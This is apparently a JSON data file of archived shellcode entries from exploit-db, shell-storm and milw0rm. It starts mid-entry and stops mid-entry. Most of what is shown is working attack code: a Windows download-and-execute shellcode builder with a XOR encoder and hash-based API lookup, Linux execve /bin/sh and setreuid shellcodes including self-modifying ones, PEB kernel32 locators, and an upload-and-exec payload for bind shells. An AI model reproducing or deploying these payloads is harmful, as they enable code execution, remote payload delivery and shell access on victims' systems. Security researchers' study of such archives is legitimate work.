ExitProcess();", "", "// ", "GetProcAddress_fun:    ", "        push    ecx", "        push    esi", "    ", "        mov     esi, [ebp+0x3C]             // e_lfanew", "        mov     esi, [esi+ebp+0x78]         // ExportDirectory RVA", "        add     esi, ebp                    // rva2va", "        push    esi", "        mov     esi, [esi+0x20]              // AddressOfNames RVA", "        add     esi, ebp                    // rva2va", "        xor     ecx, ecx", "        dec     ecx", "", "    find_start:", "        inc     ecx", "        lodsd", "        add     eax, ebp", "        xor     ebx, ebx", "        ", "    hash_loop:", "        movsx   edx, byte ptr [eax]", "        cmp     dl, dh", "        jz      short find_addr", "        ror     ebx, HASH_KEY               // hash key", "        add     ebx, edx", "        inc     eax", "        jmp     short hash_loop", "     ", "    find_addr:", "        cmp     ebx, [edi]                  // compare to hash", "        jnz     short find_start", "        pop     esi                         // ExportDirectory", "        mov     ebx, [esi+0x24]             // AddressOfNameOrdinals RVA", "        add     ebx, ebp                    // rva2va", "        mov     cx, [ebx+ecx*2]             // FunctionOrdinal", "        mov     ebx, [esi+0x1C]             // AddressOfFunctions RVA", "        add     ebx, ebp                    // rva2va", "        mov     eax, [ebx+ecx*4]            // FunctionAddress RVA", "        add     eax, ebp                    // rva2va", "        stosd                               // function address save to [edi]", "        ", "        pop     esi", "        pop     ecx", "        ret", "        ", "sc_end:", "        call sc_start", "       ", "        PROC_END                            //C macro to end proc", "    }", "}", "", "// milw0rm.com [2004-10-25]"]},
{"Title": "Windows (XP/2000/2003) - Download File (http://127.0.0.1/test.exe) + Execute (%systemdir%/a.exe) Shellcode (241 bytes)", "Author": "lion", "Published": ": 2004-10-25", "Platform": "Windows_x86", "Download": "https://old.exploit-db.com/download/13529.c", "View": "https://old.exploit-db.com/raw/13529/", "code": ["/*", "*-----------------------------------------------------------------------", "* ", "* downloadurl_v31.c - Download file and exec shellcode for Overflow exploit", "*", "* Copyright (C) 2000-2004 HUC All Rights Reserved.", "*", "* Author   : lion", "*          : lion#cnhonker.net", "*          : http://www.cnhonker.com", "*          :", "* Date     : 2003-08-15", "*          :", "* Update   : 2004-05-05 v3.1 ", "*          : 2004-01-08 v3.0", "*          : 2003-09-10 v2.0 ", "*          : 2003-08-15 v1.0  ", "*          :", "* Tested   : Windows 2000/Windows XP/windows 2003", "*          :", "* Notice   : 1. \u00cd\u00a8\u00b9\u00fdpeb\u00c8\u00a1\u00b5\u00c3kernel32.dll\u00b5\u00d8\u00d6\u00b7\u00a1\u00a3", "*          : 2. \u00cd\u00a8\u00b9\u00fd\u00ba\u00af\u00ca\u00fd\u00b5\u00c4hash\u00d6\u00b5\u00c0\u00b4\u00bd\u00f8\u00d0\u00d0\u00b1\u00c8\u00bd\u00cf\u00a3\u00ac\u00b4\u00fa\u00cc\u00e6GetProcAddress\u00c8\u00a1\u00b5\u00c3\u00ba\u00af\u00ca\u00fd\u00b5\u00d8\u00d6\u00b7\u00a3\u00ac\u00bd\u00da\u00ca\u00a1\u00ba\u00af\u00ca\u00fd\u00c3\u00fb\u00d5\u00bc\u00d3\u00c3\u00b5\u00c4\u00bf\u00d5\u00bc\u00e4\u00a1\u00a3", "*          : 3. \u00c0\u00fb\u00d3\u00c3\u00d1\u00ad\u00bb\u00b7\u00bb\u00f1\u00c8\u00a1hash\u00d6\u00b5\u00ba\u00cd\u00ba\u00af\u00ca\u00fd\u00b5\u00d8\u00d6\u00b7\u00a3\u00ac\u00bd\u00da\u00ca\u00a1\u00bf\u00d5\u00bc\u00e4\u00a1\u00a3", "*          : 4. \u00cf\u00c2\u00d4\u00d8url\u00ce\u00c4\u00bc\u00fe\u00b2\u00a2\u00d6\u00b4\u00d0\u00d0\u00a1\u00a3", "*          : 5. \u00d3\u00c3vc6\u00bf\u00c9\u00d2\u00d4\u00c3\u00fc\u00c1\u00ee\u00d0\u00d0\u00d6\u00b1\u00bd\u00d3\u00b1\u00e0\u00d2\u00eb\u00a3\u00ac\u00b7\u00bd\u00b1\u00e3\u00d0\u00de\u00b8\u00c4\u00a1\u00a3", "*          : 6. win2000/winxp/win2003 \u00cf\u00c2\u00b2\u00e2\u00ca\u00d4\u00b3\u00c9\u00b9\u00a6\u00a1\u00a3", "*          : 7. \u00b1\u00c8\u00bd\u00cf\u00d0\u00a1\u00c7\u00c9\u00a3\u00ac\u00b3\u00a4\u00b6\u00c8\u00ce\u00aa241 bytes\u00a1\u00a3", "*          :", "* Complie  : cl downloadurl_v31.c", "*          :", "* Reference: http://www.lsd-pl.net/documents/winasm-1.0.1.pdf", "*          : http://www.metasploit.com/shellcode.html", "*", "*------------------------------------------------------------------------", "*/", "", "#include <stdio.h>", "#include <winsock2.h>", "", "#pragma comment(lib, \"ws2_32\")", "", "// Use for find the ASM code", "#define PROC_BEGIN                     __asm _emit 0x90 __asm  _emit 0x90\\", "                                       __asm _emit 0x90 __asm  _emit 0x90\\", "                                       __asm _emit 0x90 __asm  _emit 0x90\\", "                                       __asm _emit 0x90 __asm  _emit 0x90", "#define PROC_END                       PROC_BEGIN", "#define SEARCH_STR                     \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\"", "#define SEARCH_LEN                     8", "#define MAX_SC_LEN                     2048", "#define HASH_KEY                       13", "", "// Define Decode Parameter", "#define DECODE_LEN                     21", "#define SC_LEN_OFFSET                  7", "#define ENC_KEY_OFFSET                 11", "#define ENC_KEY                        0x99", "", "", "// Define Function Addr", "#define ADDR_LoadLibraryA              [esi]", "#define ADDR_GetSystemDirectoryA       [esi+4]", "#define ADDR_WinExec                   [esi+8]", "#define ADDR_ExitProcess               [esi+12]", "#define ADDR_URLDownloadToFileA        [esi+16]", "//#define ADDR_URL                       edi", "", "// Need functions", "unsigned char functions[100][128] =         ", "{                                           // [esi] stack layout", "    // kernel32 4                           // 00 kernel32.dll", "    {\"LoadLibraryA\"},                       //    [esi]", "    {\"GetSystemDirectoryA\"},                //    [esi+4]", "    {\"WinExec\"},                            //    [esi+8]       ", "    {\"ExitProcess\"},                        //    [esi+12]", "    //(\"ExitThread\"},", "    //{\"TerminateProcess\"},", "    // urlmon  1                            // 01 urlmon.dll", "    {\"URLDownloadToFileA\"},                 //    [esi+16]  ", "    {\"\"},", "};", "    ", "// Shellcode string", "unsigned char  sc[1024] = {0};", "", "unsigned char url[]=", "    \"http://127.0.0.1/test.exe\\x00\";", "", "// ASM shellcode main function", "void    ShellCode();", "", "// Get function hash", "static DWORD __stdcall GetHash ( char *c )", "{", "    DWORD h = 0;", "    ", "    while ( *c )", "    {", "        __asm ror h, HASH_KEY", "        ", "        h += *c++;", "    }", "    return( h );", "}", "", "// Print Shellcode ", "void PrintSc(unsigned char *sc, int len)", "{", "    int    i,j;", "    char *p;", "    char msg[6];", "    ", "    //printf(\"/* %d bytes */\\n\", buffsize);", "    ", "    // Print general shellcode", "    for(i = 0; i < len; i++)", "    {", "        if((i%16)==0)", "        {", "            if(i!=0)", "                printf(\"\\\"\\n\\\"\");", "            else", "                printf(\"\\\"\");", "        }", "        ", "        //printf(\"\\\\x%.2X\", sc[i]);", "        ", "        sprintf(msg, \"\\\\x%.2X\", sc[i] & 0xff);", "", "        for( p = msg, j=0; j < 4; p++, j++ )", "        {", "            if(isupper(*p))", "                printf(\"%c\", _tolower(*p));", "            else", "                printf(\"%c\", p[0]);", "        }", "    }", "    ", "    printf(\"\\\";\\n\");", "}", "", "", "void Make_ShellCode()", "{", "    unsigned char  *pSc_addr;", "    unsigned int   Sc_len;", "    unsigned int   Enc_key=ENC_KEY;", "    unsigned long  dwHash[100];", "    unsigned int   dwHashSize;", "", "    int i,j,k,l;", "    ", "    ", "    // Get functions hash", "    printf(\"[+] Get functions hash strings.\\r\\n\");", "    for (i=0;;i++) ", "    {", "        if (functions[i][0] == '\\x0') break;", "", "        dwHash[i] = GetHash((char*)functions[i]);", "        printf(\"\\t%.8X\\t%s\\n\", dwHash[i], functions[i]);", "    }", "    dwHashSize = i*4;", "", "", "    // Deal with shellcode", "    pSc_addr = (unsigned char *)ShellCode;", "    ", "    for (k=0;k<MAX_SC_LEN;++k ) ", "    {", "        if(memcmp(pSc_addr+k,SEARCH_STR, SEARCH_LEN)==0) ", "        {", "            break;", "        }", "    }", "    pSc_addr+=(k+SEARCH_LEN);               // Start of the ShellCode", "    ", "    for (k=0;k<MAX_SC_LEN;++k) ", "    {", "        if(memcmp(pSc_addr+k,SEARCH_STR, SEARCH_LEN)==0) {", "            break;", "        }", "    }", "    Sc_len=k;                               // Length of the ShellCode", "    ", "    memcpy(sc, pSc_addr, Sc_len);           // Copy shellcode to sc[]", "", "", "    // Add functions hash", "    memcpy(sc+Sc_len, (char *)dwHash, dwHashSize);", "    Sc_len += dwHashSize;", "", "    // Add url ", "    memcpy(sc+Sc_len, url, sizeof(url)-1);   ", "    Sc_len += sizeof(url)-1;", "", "    // Print the size of shellcode.", "    printf(\"[+] %d + %d + %d = %d bytes shellcode\\n\", DECODE_LEN, Sc_len-DECODE_LEN-sizeof(url)+1, sizeof(url)-1, Sc_len);", "", "", "    // Print the ip/port offset", "    for(k=0; k <= Sc_len-3; ++k)", "    {", "        if(sc[k] == 0x00 && sc[k+1] == 0x35)", "            printf(\"/* port offset: %d + %d = %d */\\r\\n\", k-DECODE_LEN, DECODE_LEN, k);", "        if(sc[k] == 0x7F && sc[k+3] == 0x01)", "            printf(\"/* ip offset: %d + %d = %d */\\r\\n\", k-DECODE_LEN, DECODE_LEN, k);", "    }", "", "/*               ", "    for(i=DECODE_LEN; i<Sc_len; i++)", "    {", "       sc[i] ^= Enc_key;", "    }", "*/", "", "    // Print shellcode", "    //PrintSc(sc, Sc_len); ", "    ", "", "    // Deal with find the right XOR byte", "    for(i=0xff; i>0; i--)", "    {", "        l = 0;", "        for(j=DECODE_LEN; j<Sc_len; j++)", "        {", "            if ( ", "                   ((sc[j] ^ i) == 0x26) || //%", "                   ((sc[j] ^ i) == 0x3d) || //=", "                   ((sc[j] ^ i) == 0x3f) || //?", "                   ((sc[j] ^ i) == 0x40) || //@", "                   ((sc[j] ^ i) == 0x00) ||", "                   ((sc[j] ^ i) == 0x0D) ||", "                   ((sc[j] ^ i) == 0x0A) ", "                )                           // Define Bad Characters", "            {", "                l++;                        // If found the right XOR byte\u00a3\u00acl equals 0", "                break;", "            };", "        }", "    ", "        if (l==0)", "        {", "            Enc_key = i;", "            ", "            //printf(\"[+] Find XOR Byte: 0x%02X\\n\", i);", "            for(j=DECODE_LEN; j<Sc_len; j++)", "            {", "                sc[j] ^= Enc_key;", "            }", "", "            break;                          // If found the right XOR byte, Break", "        }", "    }", "", "    // Deal with not found XOR byte", "    if (l!=0)", "   {", "        printf(\"[-] No xor byte found!\\r\\n\");", "        exit(-1);", "    }", "", "    // Deal with DeCode string", "    *(unsigned char *)&sc[SC_LEN_OFFSET] = Sc_len;", "    *(unsigned char *)&sc[ENC_KEY_OFFSET] = Enc_key;", "", "    // Print decode", "    printf(\"/* %d bytes decode */\\r\\n\", DECODE_LEN);", "    PrintSc(sc, DECODE_LEN);", "", "    // Print shellcode", "    printf(\"/* %d bytes shellcode, xor with 0x%02x */\\r\\n\", Sc_len-DECODE_LEN, Enc_key);", "    PrintSc((char*)sc+DECODE_LEN, Sc_len-DECODE_LEN);", "    ", "    printf(\"[+] download url:%s\\n\", url);", "}", "", "void main()", "{", "    DWORD    addr;", "    WSADATA        wsa;", "    ", "    WSAStartup(MAKEWORD(2,2),&wsa);", "    ", "    Make_ShellCode();", "", "    addr = (DWORD)&sc;", "", "    __asm", "    {", "        jmp addr", "    }", "", "    return;", "}", "", "// ShellCode function", "void ShellCode()", "{", "    __asm", "    {", "        PROC_BEGIN                          // C macro to begin proc", "//--------------------------------------------------------------------", "//", "// DeCode", "//", "//--------------------------------------------------------------------", "        jmp     short decode_end", "        ", "decode_start:", "        pop     ebx                         // Decode start addr (esp -> ebx)", "        dec     ebx", "        xor     ecx,ecx", "        mov     cl,0xFF                     // Decode len", "        ", "    decode_loop:", "        xor     byte ptr [ebx+ecx],0x99     // Decode key", "        loop    decode_loop", "        jmp     short decode_ok", "", "decode_end:", "        call    decode_start", "        ", "decode_ok:", "", "//--------------------------------------------------------------------", "//", "// ShellCode", "//", "//--------------------------------------------------------------------", "        jmp     sc_end", "        ", "sc_start:         ", "        pop     edi                         // Hash string start addr (esp -> edi)", "", "        // Get kernel32.dll base addr", "        mov     eax, fs:0x30                // PEB", "        mov     eax, [eax+0x0c]             // PROCESS_MODULE_INFO", "        mov     esi, [eax+0x1c]             // InInitOrder.flink ", "        lodsd                               // eax = InInitOrder.blink", "        mov     ebp, [eax+8]                // ebp = kernel32.dll base address", "", "        mov     esi, edi                    // Hash string start addr -> esi", "    ", "        // Get function addr of kernel32", "        push    4", "        pop     ecx", "        ", "    getkernel32:", "        call    GetProcAddress_fun", "        loop    getkernel32", "", "        // Get function addr of urlmon    ", "        push    0x00006e6f", "        push    0x6d6c7275                 // urlmon", "        push    esp", "        call    ADDR_LoadLibraryA          // LoadLibraryA(\"urlmon\");", "        ", "        mov     ebp, eax                   // ebp = urlmon.dll base address", "        ", "/*", "        push    1", "        pop     ecx", "", "    geturlmon:", "        call    GetProcAddress_fun", "        loop    geturlmon", "*/", "        call    GetProcAddress_fun", "", "        // url start addr = edi", "        ", "//LGetSystemDirectoryA: ", "        sub     esp, 0x20", "        mov     ebx, esp", "        ", "        push    0x20", "        push    ebx", "        call   ADDR_GetSystemDirectoryA     // GetSystemDirectoryA", "        ", "//LURLDownloadToFileA:    ", "        // eax = system path size", "        // URLDownloadToFileA url save to a.exe", "        mov     dword ptr [ebx+eax], 0x652E615C           // \"\\a.e\"", "        mov     dword ptr [ebx+eax+0x4], 0x00006578       // \"xe\"", "        xor     eax, eax", "        push    eax", "        push    eax", "        push    ebx                         // %systemdir%\\a.exe", "        push    edi                         // url", "        push    eax", "        call    ADDR_URLDownloadToFileA     // URLDownloadToFileA", "        ", "//LWinExec:", "\t\tmov     ebx, esp", "\t\tpush    eax", "\t\tpush    ebx", "\t\tcall    ADDR_WinExec                // WinExec(%systemdir%\\a.exe);", "", "Finished:", "        //push    1", "        call    ADDR_ExitProcess            // ExitProcess();", "", "GetProcAddress_fun:    ", "        push    ecx", "        push    esi", "    ", "        mov     esi, [ebp+0x3C]             // e_lfanew", "        mov     esi, [esi+ebp+0x78]         // ExportDirectory RVA", "        add     esi, ebp                    // rva2va", "        push    esi", "        mov     esi, [esi+0x20]              // AddressOfNames RVA", "        add     esi, ebp                    // rva2va", "        xor     ecx, ecx", "        dec     ecx", "", "    find_start:", "        inc     ecx", "        lodsd", "        add     eax, ebp", "        xor     ebx, ebx", "        ", "    hash_loop:", "        movsx   edx, byte ptr [eax]", "        cmp     dl, dh", "        jz      short find_addr", "        ror     ebx, HASH_KEY               // hash key", "        add     ebx, edx", "        inc     eax", "        jmp     short hash_loop", "     ", "    find_addr:", "        cmp     ebx, [edi]                  // compare to hash", "        jnz     short find_start", "        pop     esi                         // ExportDirectory", "        mov     ebx, [esi+0x24]             // AddressOfNameOrdinals RVA", "        add     ebx, ebp                    // rva2va", "        mov     cx, [ebx+ecx*2]             // FunctionOrdinal", "        mov     ebx, [esi+0x1C]             // AddressOfFunctions RVA", "        add     ebx, ebp                    // rva2va", "        mov     eax, [ebx+ecx*4]            // FunctionAddress RVA", "        add     eax, ebp                    // rva2va", "        stosd                               // function address save to [edi]", "        ", "        pop     esi", "        pop     ecx", "        ret", "        ", "sc_end:", "        call sc_start", "       ", "        PROC_END                            //C macro to end proc", "    }", "}", "", "// milw0rm.com [2004-10-25]"]},
{"Title": "Linux/x86 - Self-Modifying Radical Shellcode (70 bytes)", "Author": "xort", "Published": ": 2004-12-22", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-248.php", "View": null, "code": ["/*-------------------------------------------------------*/", "/*     Radically Self Modifying Code for surviving       */", "/*            toupper() and tolower()                    */", "/*                                                       */", "/*         70byte execve & _exit() code by XORt          */", "/*-------------------------------------------------------*/", "\"\\xeb\\x12\"                 /* jmp $0x12                  */", "\"\\x5e\"                     /* pop %esi                   */", "/*-set-up-loop-counter-and-ajust-shellcode-pointer-------*/", "\"\\x31\\xc9\"                 /* xor %ecx, %ecx             */", "\"\\xb1\\x0b\"                 /* mov $0xb, %cl              */", "\"\\xff\\xc6\"                 /* inc %esi                   */", "/*-the-loop----------------------------------------------*/", "\"\\x81\\x06\\x5b\\x2d\\xd0\\xcb\" /* addl $0xcbd02d5b, (%esi)   */", "\"\\xad\"                     /* lodsl                      */", "\"\\xe2\\xf7\"                 /* loop -$0x9                 */", "/*--jump-into-shellcode----------------------------------*/", "\"\\xeb\\x05\"                 /* jmp $0x5                   */", "\"\\xe8\\xe9\\xff\\xff\\xff\"     /* call -$0x17                */", "/*--------------------------------------------[bytes:25]-*/", "//                                                       //", "/*--the-shellcode----------------------------------------*/", "\"\\xeb\"                     /* --then encoded shellcode-- */", "\"\\xc4\\x30\\xb9\\xaa\"         /*                            */", "\"\\xad\\x03\\xf0\\xbc\"         /*                            */", "\"\\xeb\\xd9\\xb8\\x7a\"         /*                            */", "\"\\xb1\\x82\\x3b\\xbd\"         /*                            */", "\"\\x98\\x60\\x7e\\x3c\"         /*                            */", "\"\\x32\\x29\\x3c\\x01\"         /*                            */", "\"\\x25\\x04\\x0b\\xbe\"         /*                            */", "\"\\x7d\\x13\\xfd\\xb4\"         /*                            */", "\"\\x8d\\xaf\\x2f\\x34\"         /*                            */", "\"\\xa4\\x02\\x92\\x9d\"         /*                            */", "\"\\x13\\x02\\xa3\\x9c\";        /*                            */", "/*--------------------------------------------[bytes:45]-*/", "", "", "// milw0rm.com [2004-12-22]"]},
{"Title": "Linux/x86 - Self-Modifying Magic Byte /bin/sh Shellcode (76 bytes)", "Author": "xort", "Published": ": 2004-12-22", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-249.php", "View": null, "code": ["/*-------------------------------------------------------*/", "/*     Magic Byte Self Modifying Code for surviving      */", "/*               toupper() & tolower()                   */", "/*        76bytes execve() _exit() code by XORt          */", "/*-------------------------------------------------------*/", "\"\\xeb\\x34\"               /* jmp $0x34          [revert]  */", "\"\\x5e\"                   /* pop %esi                     */", "/*--set-up-variables-------------------------------------*/", "\"\\x89\\xf7\"               /* mov %esi, %edi               */", "\"\\x83\\xef\\x22\"           /* sub $0x22, %edi              */", "\"\\x31\\xc9\"               /* xor %ecx, %ecx               */", "\"\\xb1\\x8c\"               /* mov $0x8c, %cl               */", "\"\\xd1\\xc9\"               /* ror $0x1, %ecx    (70loops)  */", "/*-scan-for-magic-byte-----------------------------------*/", "\"\\xb0\\x7b\"               /* mov $0x7b, %al               */", "\"\\xf2\\xae\"               /* repne scasb                  */", "\"\\xff\\xcf\"               /* dec %edi                     */", "\"\\xac\"                   /* lodsb            (al=DS:SI)  */", "\"\\x28\\x07\"               /* subb %al, (%edi)             */", "/*--loop-back-to-scanner---------------------------------*/", "\"\\xe2\\xf5\"               /* loop -$0xe      [load-byte]  */", "/*-------------------------------------[length:25bytes]--*/", "//                                                       //", "/*--modified-shellcode-----------------------------------*/", "\"\\x89\\x7b\\x08\"           /* movl %esi, 0x8(%esi)        @*/", "\"\\x91\"                   /* xchg %eax, %ecx              */", "\"\\x88\\x7b\\x07\"           /* movb %al, 0x7(%esi)         @*/", "\"\\x89\\x7b\\x0c\"           /* movl %eax, 0xc(%esi)        @*/", "\"\\xb0\\x0b\"               /* movb $0xb, %al               */", "\"\\x89\\xf3\"               /* movl %esi, %ebx              */", "\"\\x8d\\x7b\\x08\"           /* leal 0x8(%esi), %ecx        @*/", "\"\\x8d\\x7b\\x0c\"           /* leal 0xc(%esi), %edx        @*/", "\"\\xcd\\x80\"               /* int $0x80                    */", "\"\\x31\\xdb\"               /* xorl %ebx, %ebx              */", "\"\\x89\\xd8\"               /* movl %ebx, %eax              */", "\"\\x40\"                   /* inc %eax                     */", "\"\\xcd\\x80\"               /* int $0x80                    */", "/*--revert-----------------------------------------------*/", "\"\\xe8\\xc7\\xff\\xff\\xff\"   /* call -$0x39                  */", "/*--offset-table-----------------------------------------*/", "\"\\x05\\x35\\x35\\x2d\\x25\\x19\\x12\\x0d\\x08\\x13\"             /**/", "/*--string-to-run----------------------------------------*/", "\"/\\x7b\\x7b\\x7b/\\x7b\\x7b\" /* .string \"/bin/sh\"            */", "/*--------------------------------------[length:51bytes]-*/", "", "", "// milw0rm.com [2004-12-22]"]},
{"Title": "Linux/x86 - setreuid() + execve() Shellcode (31 bytes)", "Author": "oc192", "Published": ": 2004-12-26", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-261.php", "View": null, "code": ["/* 31 byte setreuid() shellcode - # man shadow", "* os: Slackware 9.1, Phlak 2.4, Knoppix 0.1", "*", "* www.manshadow.org", "* r-22@manshadow.org", "* irc.efnet.net #_man_shadow", "*/", "", "char shellcode[] =", "\"\\x31\\xC9\"              /* xor ecx,ecx     */", "\"\\x31\\xDB\"              /* xor ebx,ebx     */", "\"\\x6A\\x46\"              /* push byte 70    */", "\"\\x58\"                  /* pop eax         */", "\"\\xCD\\x80\"              /* int 80h         */", "\"\\x51\"                  /* push ecx        */", "\"\\x68\\x2F\\x2F\\x73\\x68\"  /* push 0x68732F2F */", "\"\\x68\\x2F\\x62\\x69\\x6E\"  /* push 0x6E69622F */", "\"\\x89\\xE3\"              /* mov ebx,esp     */", "\"\\x51\"                  /* push ecx        */", "\"\\x53\"                  /* push ebx        */", "\"\\x89\\xE1\"              /* mov ecx,esp     */", "\"\\x99\"                  /* cdq             */", "\"\\xB0\\x0B\"              /* mov al,11       */", "\"\\xCD\\x80\";             /* int 80h         */", "", "int main(int argc, char *argv[]) {", "       void (*sc)() = (void *)shellcode;", "       printf(\"len:%d\\n\", strlen(shellcode));", "       sc();", "       return 0;", "}", "", "// milw0rm.com [2004-12-26]"]},
{"Title": "Windows (9x/NT/2000/XP) - PEB Method Shellcode (35 bytes)", "Author": "oc192", "Published": ": 2005-01-09", "Platform": "Windows_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-260.php", "View": null, "code": ["/*This is a 35 byte C implementation of the use of the PEB method to get", "*the kernel32 base address on Windows. This is generic code designed to", "*run on both Windows 9x and NT based systems. The code has been optimized", "*to not have any 00h bytes so that you wont have to use an XOR routine to", "*encode the shellcode. I used relative jumps and xor tricks to avoid the", "*00h bytes and make the code as small as I could get it. Feel free to use", "*this source in anything that you want.", "*/", "", "", "/* 35 byte PEB method for Windows 9x/NT/2k/XP", "*  0x00 byte optimized, no XOR routine required.", "*", "*  www.4x10m.com", "*  oc.192", "*  irc.4x10m.net #4x10m", "*/", "", "unsigned char shellcode[] =", "/*  35 byte PEB - 00h removal and size optimized  */", "/*      22 - 24 total clock cycles on a x486      */", "\"\\x31\\xC0\"                  /* xor eax, eax       */", "\"\\x31\\xD2\"                  /* xor edx, edx       */", "\"\\xB2\\x30\"                  /* mov dl, 30h        */", "\"\\x64\\x8B\\x02\"              /* mov eax, [fs:edx]  */      /* PEB base address */", "\"\\x85\\xC0\"                  /* test eax, eax      */", "\"\\x78\\xC0\"                  /* js 0Ch             */", "\"\\x8B\\x40\\x0C\"              /* mov eax, [eax+0Ch] */      /* NT kernel32 routine */", "\"\\x8B\\x70\\x1C\"              /* mov esi, [eax+1Ch] */", "\"\\xAD\"                      /* lodsd              */", "\"\\x8B\\x40\\x08\"              /* mov eax, [eax+08h] */", "\"\\xEB\\x07\"                  /* jmp short 09h      */", "\"\\x8B\\x40\\x34\"              /* mov eax, [eax+34h] */      /* 9x kernel32 routine */", "\"\\x8D\\x40\\x7C\"              /* lea eax, [eax+7Ch] */", "\"\\x8D\\x40\\x3C\"              /* mov eax, [eax+3Ch] */", ";", "", "int main(int argc, char *argv[]) {", "      //void (*sc)() = (void *)shellcode;", "      printf(\"len:%d\\n\", sizeof(shellcode));", "      //sc();", "      return 0;", "}", "", "// milw0rm.com [2005-01-09]"]},
{"Title": "Windows (9x/NT/2000/XP) - PEB Method Shellcode (31 bytes)", "Author": "twoci", "Published": ": 2005-01-26", "Platform": "Windows_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-387.php", "View": null, "code": ["/*", "004045F4 > 6A 30            PUSH 30", "004045F6   59               POP ECX", "004045F7   64:8B09          MOV ECX,DWORD PTR FS:[ECX]", "004045FA   85C9             TEST ECX,ECX", "004045FC   78 0C            JS SHORT OllyTest.0040460A", "004045FE   8B49 0C          MOV ECX,DWORD PTR DS:[ECX+C]", "00404601   8B71 1C          MOV ESI,DWORD PTR DS:[ECX+1C]", "00404604   AD               LODS DWORD PTR DS:[ESI]", "00404605   8B48 08          MOV ECX,DWORD PTR DS:[EAX+8]", "00404608   EB 09            JMP SHORT OllyTest.00404613", "0040460A   8B49 34          MOV ECX,DWORD PTR DS:[ECX+34]", "0040460D   8B49 7C          MOV ECX,DWORD PTR DS:[ECX+7C]", "00404610   8B49 3C          MOV ECX,DWORD PTR DS:[ECX+3C]", "*/", "", "/*", "31 byte C PEB kernel base location method works on win9x-win2k3", "no null bytes, so no need to xor.", "", "-twoci", "*/", "", "unsigned char PEBCode[] =", "{\"\\x6A\\x30\"", "\"\\x59\"", "\"\\x64\\x8B\\x09\"", "\"\\x85\\xC9\"", "\"\\x78\\x0C\"", "\"\\x8B\\x49\\x0C\"", "\"\\x8B\\x71\\x1C\"", "\"\\xAD\"", "\"\\x8B\\x48\\x08\"", "\"\\xEB\\x09\"", "\"\\x8B\\x49\\x34\"", "\"\\x8B\\x49\\x7C\"", "\"\\x8B\\x49\\x3C\"};", "", "int main( int argc, char *argv[] )", "{", "   printf( \"sizeof(PEBCode) = %u\\n\", sizeof(PEBCode) );", "   return 0;", "}", "", "// milw0rm.com [2005-01-26]"]},
{"Title": "Linux/x86 - upload + exec Shellcode (189 bytes)", "Author": "cybertronic", "Published": ": 2005-06-19", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-54.php", "View": null, "code": ["UPLOAD & EXEC SHELLCODE", "", "[1] converting asm to hex", "[2] asm code", "[3] hex output", "[4] upload function", "", "This is an 'upload and exec' shellcode for the x86 platform.", "File has to be in executable format,", "cool if you know the distribution of the target, otherwise", "it is useless.", "", "-cybertronic", "", "[1]", "", "/*", " * convert .s to shellcode typo/teso (typo@inferno.tusculum.edu)", " *", " * $ cat asm.s", " * .globl cbegin", " * .globl cend", " * cbegin:", " * \"asm goes here\"", " * cend:", " * $ gcc -Wall asm.s asm2hex.c -o out", " * $ ./out", " *", " */", "", "#include", "", "extern void cbegin();", "extern void cend();", "", "int", "main ()", "{", "    int i = 0;", "    int x = 0;", "    char* buf = ( char* ) cbegin;", "", "    printf ( \"unsigned char shellcode[] =\\n\\\"\" );", "    for ( ; ( *buf ) && ( buf < ( char* ) cend ); buf++ )", "\t{", "\t\tif ( i++ == 16 )", "\t\t\ti = 1;", "\t\tif ( i == 1 && x != 0 )", "\t\t\tprintf ( \"\\\"\\n\\\"\" );", "\t\tx = 1;", "\t\tprintf ( \"\\\\x%02x\", ( unsigned char )* buf );", "\t}", "\tprintf ( \"\\\";\\n\" );", "    return ( 0 );", "}", "", "[2]", "", "# append to any bind shellcode", "# gcc -Wall upload-exec.s asm2hex.c -o upload-exec", "# cybertronic", "", ".globl cbegin", ".globl cend", "", "cbegin:", "", "\tmovl %eax,%ecx", "", "\tjmp getstr", "", "start:", "", "\tpopl %esi", "", "\tleal (%esi),%ebx", "\txorl %eax,%eax", "\tmovb %al,0x0b(%esi)", "", "\tpushl %esi", "\tpushl %ecx", "", "\tmovb $0x05,%al", "\tmovw $0x241,%cx", "\tmovw $00777,%dx", "\tint  $0x80", "\tmovl %eax,%edi", "\tpopl %esi", "", "read:", "", "\tmovl %esi,%ebx", "\tmovb $0x03,%al", "\tleal -200(%esp),%ecx", "\tmovb $0x01,%dl", "\tint  $0x80", "", "\tcmpl $0xffffffff,%eax", "\tje end", "\txorl %ecx,%ecx", "\tcmpl %eax,%ecx", "\tje continue", "", "\tleal -200(%esp),%ecx", "\txorl %ebx,%ebx", "\tmovl %edi,%ebx", "\tmovl %eax,%edx", "\tmovb $0x04,%al", "\tint  $0x80", "", "\tjmp read", "", "continue:", "", "\tmovb $0x06,%al", "\tmovl %esi,%ebx", "\tint  $0x80", "\tmovb $0x06,%al", "\txorl %ebx,%ebx", "\tmovl %edi,%ebx", "\tint  $0x80", "", "\txorl %esi, %esi", "\tpopl %esi", "\tmovl %esi,0x0c(%esi)", "\txorl %eax,%eax", "\tmovl %eax,0x10(%esi)", "\tmovb $0x0b,%al", "\txchgl %esi,%ebx", "\tleal 0x0c(%ebx),%ecx", "\tleal 0x10(%ebx),%edx", "\tint $0x80", "", "end:", "", "\txorl %eax,%eax", "\tincl %eax", "\tint $0x80", "", "getstr:", "", "\tcall start", "\t.string \"/usr/bin/ct\"", "", "cend:", "", "[3]", "", "/*", " * linux x86", " * 189 bytes upload & exec shellcode by cybertronic", " * cybertronic[at]gmx[dot]net", " *", " */", "", "unsigned char shellcode[] =", "\"\\x31\\xdb\\xf7\\xe3\\xb0\\x66\\x53\\x43\\x53\\x43\\x53\\x89\\xe1\\x4b\\xcd\\x80\"", "\"\\x89\\xc7\\x52\\x66\\x68\\xc7\\xc7\\x43\\x66\\x53\\x89\\xe1\\xb0\\xef\\xf6\\xd0\"", "\"\\x50\\x51\\x57\\x89\\xe1\\xb0\\x66\\xcd\\x80\\xb0\\x66\\x43\\x43\\xcd\\x80\\x50\"", "\"\\x50\\x57\\x89\\xe1\\x43\\xb0\\x66\\xcd\\x80\\x89\\xc1\\xeb\\x70\\x5e\\x8d\\x1e\"", 